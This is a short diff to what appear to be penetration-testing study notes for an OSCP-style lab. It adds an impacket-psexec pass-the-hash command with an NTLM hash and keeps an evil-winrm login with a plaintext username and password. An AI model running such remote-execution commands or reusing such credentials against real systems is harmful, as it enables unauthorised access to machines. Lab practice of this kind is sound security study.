@@ -1,6 +1,10 @@
 [[Editing Copy Page]]
 
 ```
+impacket-psexec oscp.exam/tom_admin@10.10.162.154 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc
+```
+
+```
 evil-winrm -i 192.168.162.153 -u 'Eric.Wallows' -p 'EricLikesRunning800'
 ```
 
